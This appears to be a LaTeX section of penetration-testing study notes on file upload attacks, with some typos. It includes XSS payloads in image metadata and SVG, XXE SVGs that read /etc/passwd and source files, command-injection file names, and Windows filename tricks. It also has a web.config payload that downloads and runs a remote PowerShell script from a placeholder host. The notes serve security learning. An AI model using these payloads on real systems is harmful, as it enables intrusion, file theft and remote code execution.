
\section{Opther attacks}
\subsection{Limited file uploads}
Certain file types, like SVG, HTML, XML, and even some image and document
files, may allow us to introduce new vulnerabilities to the web application by
uploading malicious versions of these files. This is why fuzzing allowed file
extensions is an important exercise for any file upload attack. It enables us
to explore what attacks may be achievable on the web server. So, let's explore
some of these attacks.

\subsubsection{XSS}
Many file types may allow us to introduce a Stored XSS vulnerability to the web
application by uploading maliciously crafted versions of them.

{\bf Image metadata}: XSS payload can be injected in text fields that are
displayed by the application surch as \verb+Comment+ or,\verb+Artist+:
\begin{verbatim}
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' PIC.jpg
exiftool PIC.jpg
\end{verbatim}

Furthermore, if we change the image's MIME-Type to i\verb+text/html+, some web
applications may show it as an HTML document instead of an image, in which case
the XSS payload would be triggered even if the metadata wasn't directly
displayed.

{\bf Scalable Vector Graphics (SVG)} images are XML-based, and they describe 2D
vector graphics, which the browser renders into an image.
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>
\end{verbatim}


\subsubsection{XEE}

{\bf SVG} can also include malicious XML data to leak the source code of the
web application, and other internal documents within the server. the result may
be displayed in the {\bf page source}.

\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
\end{verbatim}

displaying the source code would be also of great interest
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 
    "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
\end{verbatim}

Using XML data is not unique to SVG images, as it is also utilized by many
types of documents, like {\bf PDF}, {\bf Word Documents}, {\bf PowerPoint
Documents}, among many others. All of these documents include XML data within
them to specify their format and structure. 


Another similar attack that is also achievable through these file types is an
{\bf SSRF attack}. We may utilize the XXE vulnerability to enumerate the
internally available services or even call private APIs to perform private
actions. 


\subsubsection{DoS}

DoS can be achived by different means:
\begin{itemize}
        \item XXE payloads
        \item i{\bf Decompression Bomb} with file types that use data compression,
            like ZIP archivesa
        \item {\bf Pixel Flood} attack with some image files that utilize image
            compression, like JPG or PNG
\end{itemize}

In addition to these attacks, we may try a few other methods to cause a DoS on
the back-end server. One way is uploading an overly large file, as some upload
forms may not limit the upload file size or check for it before uploading it,
which may fill up the server's hard drive and cause it to crash or slow down
considerably.

If the upload function is vulnerable to directory traversal, it is possible to
upload files to a different directory (e.g. \verb+../../../etc/passwd+), which
may also cause the server to crash.


\subsection{Injection in file name}

A common file upload attack uses a malicious string for the uploaded file name,
which may get executed or processed if the uploaded file name is reflected on
the page.
\begin{verbatim}
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami

\end{verbatim}



\subsection{Upload directory discolsure}

In some file upload forms, like a feedback form or a submission form, the link
of the uploaded file may not be accessible  and the the uploads directory may
also be unknown. In such cases, Fuzzing may be used to look for the uploads
directory or even use other vulnerabilities ({\bf LFI/XXE}) to find where the
uploaded files are by reading the web applications source code. Furthermore,
with Web attack based on {\bf Insecure Direct Object References (IODR)} offers
several methods of finding where files may be stored and identifying the file
naming scheme.

Another method we can use to disclose the uploads directory is through forcing
error messages, as they often reveal helpful information for further
exploitation. One attack useid to cause such errors is uploading a file with a
name that already exists or sending two identical requests simultaneously. This
may lead the web server to show an error that it could not write the file,
which may disclose the uploads directory. It is also possible to  try uploading
a file with an overly long name (e.g., 5,000 characters). If the web
application does not handle this correctly, it may also error out and disclose
the upload directory.

Similarly, there exists various other techniques to cause the server to error
out and disclose the uploads directory, along with additional helpful
information.



\subsection{Windows specific}
One attack is using reserved characters, such as (\verb+|, <, >, *, or ?+),
which are usually reserved for special uses like wildcards. If the web
application does not properly sanitize these names or wrap them within quotes,
they may refer to another file (which may not exist) and cause an error that
discloses the upload directory. Similarly,  Windows reserved names might be
used for the uploaded file name, like (CON, COM1, LPT1, or NUL), which may also
cause an error as the web application will not be allowed to write a file with
this name.

Finally, the \href{https://en.wikipedia.org/wiki/8.3_filename}{Windows 8.3
Filename Convention}  may be used to overwrite existing files or refer to files
that do not exist. Older versions of Windows were limited to a short length for
file names, so they used a Tilde character (~) to complete the file name, which
we can use to our advantage.

For example, to refer to a file called (\verb+hackthebox.txt+)
(\verb+HAC~1.TXT+) or (\verb+HAC~2.TXT+) can be used , where the digit
represents the order of the matching files that start with (HAC). As Windows
still supports this convention,  a file called (e.g.
\verb+WEB~.CONF+) can be used to overwrite the \verb+web.conf+ file. Similarly,
trying to  write a file that replaces sensitive system files. This attack can
lead to several outcomes, like causing information disclosure through errors,
causing a DoS on the back-end server, or even accessing private files.



\subsection{Advanced file upload attacks}

there are more advanced attacks that can be used with file upload
functionalities. Any automatic processing that occurs to an uploaded file, like
encoding a video, compressing a file, or renaming a file, may be exploited if
not securely coded.

Some commonly used libraries may have public exploits for such vulnerabilities,
like the AVI upload vulnerability leading to XXE in \verb+ffmpeg+. However,
when dealing with custom code and custom libraries, detecting such
vulnerabilities requires more advanced knowledge and techniques, which may lead
to discovering an advanced file upload vulnerability in some web applications.


\subsection{web.config and .htaccess RCE}
\subsubsection{web.config}
The
\href{https://learn.microsoft.com/en-us/previous-versions/ms178684(v=vs.140)}{web.config}
file plays an important role in storing IIS7 (and higher)
settings. It is very similar to a .htaccess file in Apache web server.
\verb+Web.config+ files can appear in multiple directories in ASP.NET
applications

In IIS7 (and higher), it is possible to do similar tricks by uploading or
making a web.config file. A few of these tricks might even be applicable to
IIS6 with some minor changes. The techniques below show some different
web.config files that can be used to bypass protections around the file
uploaders.

Sometimes IIS supports ASP files but it is not possible to upload any file with
.ASP extension. In this case, it is possible to use a web.config file directly
to run ASP classic codes. See this article
\href{https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/}{Upload
a web.config File for Fun and Profit}


\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.webServer>
<handlers accessPolicy="Read, Script, Write">
<add name="web_config" path="*.config" verb="*" modules="IsapiModule"
scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified"
requireAccess="Write" preCondition="bitness64" />
</handlers>
<security>
<requestFiltering>
<fileExtensions>
<remove fileExtension=".config" />
</fileExtensions>
<hiddenSegments>
<remove segment="web.config" />
</hiddenSegments>
</requestFiltering>
</security>
</system.webServer>
<appSettings>
</appSettings>
</configuration>
<%
Set objShell = CreateObject("WScript.Shell")
strCommand = "cmd /c powershell.exe -c IEX (New-Object
Net.Webclient).downloadstring('http://<IP>/shell.ps1')"
Set objShellExec = objShell.Exec(strCommand)
strOutput = objShellExec.StdOut.ReadAll()
WScript.StdOut.Write(strOutput)
WScript.Echo(strOutput)
%>
\end{verbatim}

\subsubsection{.htaccess}
\url{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess}
